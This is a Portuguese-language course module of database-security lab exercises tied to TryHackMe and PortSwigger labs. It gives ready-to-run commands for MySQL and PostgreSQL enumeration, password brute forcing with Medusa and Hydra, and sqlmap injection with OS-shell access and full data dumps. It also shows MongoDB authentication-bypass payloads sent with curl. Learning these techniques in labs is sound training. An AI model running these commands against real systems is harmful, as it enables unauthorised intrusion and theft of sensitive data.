# 🗄️ Módulo 12: Labs de Database Security

## Pré-requisitos

| Pré-requisito | Nível | Observação |
|---------------|-------|------------|
| SQL básico | ⭐⭐ | SELECT, INSERT, JOIN |
| MySQL/PostgreSQL | ⭐⭐ | Client commands |
| NoSQL concepts | ⭐ | MongoDB basics |
| Linux permissions | ⭐⭐ | Filesystem access |

---

## 📋 Exercício 1: Enumeração de MySQL

**Objetivo:** Enumerar bancos MySQL e descobrir databases

**Conhecimentos necessários:**
- MySQL enumeration
- Databases e tables
- User privileges

**Ferramentas:**
- sqlmap
- mysql client

**Passo a passo:**

1. Instale MySQL client:
```bash
sudo apt install mysql-client
```

2. Conecte-se ao servidor:
```bash
mysql -h 10.10.10.10 -u root -p
```

3. Enumere databases:
```sql
SHOW databases;
```

4. Use sqlmap para enumeração automática:
```bash
sqlmap -u "http://target/page.php?id=1" --dbs
```

5. Liste tabelas do banco encontrado:
```bash
sqlmap -u "http://target/page.php?id=1" -D database_name --tables
```

6. Documente estrutura completa encontrada

**Macetes:**
- `sqlmap -u URL --dbs` para listar databases
- `mysql -h IP -u root -p` para conexão direta
- Testar credenciais padrão: root/root, root/mysql, root/password
- Verificar versão do MySQL: `SELECT version();`

**Checklist:**
- [ ] MySQL client instalado
- [ ] Conexão testada
- [ ] Databases enumerados
- [ ] sqlmap configurado
- [ ] Estrutura documentada
- [ ] Credenciais testadas

**Link:** https://tryhackme.com/room/dvwa
**Tempo estimado:** 30 min

---

## 📋 Exercício 2: Brute Force em Banco de Dados

**Objetivo:** Quebrar senhas de bancos de dados

**Conhecimentos necessários:**
- Database authentication
- Default credentials
- Brute force techniques

**Ferramentas:**
- Medusa
- Hydra

**Passo a passo:**

1. Instale Medusa:
```bash
sudo apt install medusa
```

2. Brute force MySQL:
```bash
medusa -h 10.10.10.10 -u admin -P passwords.txt -M mysql
```

3. Teste credenciais padrão:
```bash
medusa -h 10.10.10.10 -u root -P common_passwords.txt -M mysql
```

4. Use Hydra como alternativa:
```bash
hydra -l root -P passwords.txt 10.10.10.10 mysql
```

5. Teste PostgreSQL:
```bash
medusa -h 10.10.10.10 -u postgres -P passwords.txt -M postgres
```

6. Documente credenciais encontradas

**Macetes:**
- `Medusa -h IP -u admin -P passwords.txt -M mysql` para MySQL
- Testar `root` sem senha primeiro
- Wordlists: `/usr/share/wordlists/rockyou.txt`
- Credenciais padrão comuns: root:root, root:mysql, admin:admin

**Checklist:**
- [ ] Medusa instalado
- [ ] MySQL brute force executado
- [ ] Credenciais padrão testadas
- [ ] Hydra testado como alternativa
- [ ] PostgreSQL testado
- [ ] Credenciais encontradas documentadas

**Link:** https://tryhackme.com/room/dvwa
**Tempo estimado:** 35 min

---

## 📋 Exercício 3: SQL Injection Avançado

**Objetivo:** Exploração avançada de SQL Injection

**Conhecimentos necessários:**
- Union-based SQLi
- Blind SQLi (boolean e time-based)
- Stacked queries

**Ferramentas:**
- sqlmap

**Passo a passo:**

1. Identifique injetável:
```bash
sqlmap -u "http://target/page.php?id=1"
```

2. Teste Union-based:
```bash
sqlmap -u "http://target/page.php?id=1" --technique=U --union-cols=10
```

3. Teste Blind SQLi:
```bash
sqlmap -u "http://target/page.php?id=1" --technique=B
```

4. Teste Time-based blind:
```bash
sqlmap -u "http://target/page.php?id=1" --technique=T
```

5. Execute OS commands:
```bash
sqlmap -u "http://target/page.php?id=1" --os-shell
```

6. Interaja com shell obtido

**Macetes:**
- `--technique=U` para union-based
- `--technique=B` para blind boolean
- `--technique=T` para time-based
- `--os-shell` para execução de comandos (se DBA)

**Checklist:**
- [ ] Injetável identificado
- [ ] Union-based testado
- [ ] Blind SQLi testado
- [ ] Time-based testado
- [ ] OS shell obtido
- [ ] Comandos executados

**Link:** https://tryhackme.com/room/sqlinjectionlm
**Tempo estimado:** 45 min

---

## 📋 Exercício 4: NoSQL Injection

**Objetivo:** Explorar injeções em bancos NoSQL (MongoDB)

**Conhecimentos necessários:**
- MongoDB operators ($gt, $ne, $regex)
- JSON injection
- Authentication bypass

**Ferramentas:**
- NoSQLMap

**Passo a passo:**

1. Instale NoSQLMap:
```bash
git clone https://github.com/codingo/NoSQLMap
```

2. Execute o NoSQLMap:
```bash
python3 nosqlmap.py
```

3. Configure target e parâmetros

4. Teste injection manual com curl:
```bash
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
```

5. Teste bypass de autenticação:
```bash
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": ""}}'
```

6. Documente técnicas que funcionaram

**Macetes:**
- `{"$gt": ""}` para bypass numérico
- `{"$ne": ""}` para bypass de senha
- Testar em parâmetros de login
- NoSQLMap automatiza esses testes

**Checklist:**
- [ ] NoSQLMap instalado
- [ ] Target configurado
- [ ] Operator injection testado
- [ ] Auth bypass testado
- [ ] curl usado para testes manuais
- [ ] Resultados documentados

**Link:** https://portswigger.net/web-security/nosql-injection
**Tempo estimado:** 40 min

---

## 📋 Exercício 5: Exfiltração de Dados

**Objetivo:** Extrair dados sensíveis de bancos de dados

**Conhecimentos necessários:**
- Data exfiltration techniques
- Blind data extraction
- Data staging

**Ferramentas:**
- sqlmap
- curl

**Passo a passo:**

1. Dump todos os dados:
```bash
sqlmap -u "http://target/page.php?id=1" --dump
```

2. Dump banco específico:
```bash
sqlmap -u "http://target/page.php?id=1" -D target_db --dump
```

3. Dump tabelas específicas:
```bash
sqlmap -u "http://target/page.php?id=1" -D target_db -T users --dump
```

4. Filtre com WHERE:
```bash
sqlmap -u "http://target/page.php?id=1" -D target_db -T users --dump --where="role='admin'"
```

5. Pagine resultados:
```bash
sqlmap -u "http://target/page.php?id=1" --dump --start=1 --stop=100
```

6. Exporte dados para análise

**Macetes:**
- `--dump` para extrair tudo
- `--where` para filtrar dados específicos
- `--start/stop` para paginar grandes volumes
- Verificar dados sensíveis: passwords, PII, tokens

**Checklist:**
- [ ] Dump completo executado
- [ ] Banco específico extraído
- [ ] Tabelas específicas analisadas
- [ ] Filtros WHERE aplicados
- [ ] Paginação testada
- [ ] Dados sensíveis identificados

**Link:** https://tryhackme.com/room/dvwa
**Tempo estimado:** 45 min

---

## 📋 Exercício 6: Pentest de Banco Completo (Final Challenge)

**Objetivo:** Pentest completo de infraestrutura de banco de dados

**Conhecimentos necessários:**
- Todas as técnicas do módulo
- Metodologia completa
- Escalação de privilégios

**Ferramentas:**
- sqlmap
- Medusa
- NoSQLMap

**Passo a passo:**

1. Enumere alvos:
```bash
nmap -sV -p 3306,5432,27017 10.10.10.0/24
```

2. Brute force credenciais:
```bash
medusa -h TARGET -u root -P passwords.txt -M mysql
```

3. Teste SQL Injection:
```bash
sqlmap -u "http://target/page.php?id=1" --batch
```

4. Extraia dados:
```bash
sqlmap -u "http://target/page.php?id=1" --dump
```

5. Teste escalação:
```bash
sqlmap -u "http://target/page.php?id=1" --os-shell
```

6. Documente toda a cadeia de ataque

**Macetes:**
- Fluxo: Enumerate → Brute Force → Inject → Extract → Escalate
- Documentar cada passo com evidências
- Verificar se há múltiplos bancos
- Testar tanto SQL quanto NoSQL

**Checklist:**
- [ ] Alvos enumerados via Nmap
- [ ] Brute force executado
- [ ] SQL Injection testado
- [ ] Dados extraídos
- [ ] Escalação de privilégios testada
- [ ] Relatório completo gerado

**Link:** https://tryhackme.com/room/dvwa
**Tempo estimado:** 90 min

---

## 📊 Resumo do Módulo

| Exercício | Habilidade | Tempo |
|-----------|-----------|-------|
| 1. Enumeração MySQL | Discovery | 30 min |
| 2. Brute Force DB | Credenciais | 35 min |
| 3. SQL Injection Avançado | Injeção | 45 min |
| 4. NoSQL Injection | NoSQL | 40 min |
| 5. Exfiltração de Dados | Extração | 45 min |
| 6. Pentest DB Completo | Integração | 90 min |
